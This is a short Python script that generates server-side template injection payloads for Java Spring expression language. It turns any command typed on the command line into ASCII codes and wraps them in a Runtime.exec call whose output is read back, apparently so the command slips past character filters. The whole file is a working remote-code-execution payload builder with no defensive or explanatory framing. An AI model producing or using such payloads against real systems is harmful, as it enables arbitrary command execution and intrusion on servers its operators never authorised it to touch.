import sys
import colorama
from colorama import Fore, Style

def textToAscii(argv):

	string = argv.pop(0)
	print(string)
	ascii_values = []
	print (Fore.YELLOW + '[*] Translating argument string to ascii code . . .')
	for character in string:	
		ascii_values.append(ord(character))
	
	return(ascii_values)	
	
def payload(ascii_code):
	
	initial_string = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(' + str(ascii_code.pop(0)) + ')'
	string = ''
	for element in ascii_code:
		string = string +'.concat(T(java.lang.Character).toString(' + str(element) + '))'
	final_string = initial_string + string + ').getInputStream())}'
	print(Fore.GREEN + '[*] Payload created -->  ' + final_string + Fore.WHITE)

def main(argv):
	
	argv.pop(0)
	print(argv)
	ascii_string = textToAscii(argv)
	print(Fore.YELLOW + '[*] Creating payload . . .' + Fore.WHITE)
	payload(ascii_string)

if __name__ == '__main__':

	sys.exit(main(sys.argv))
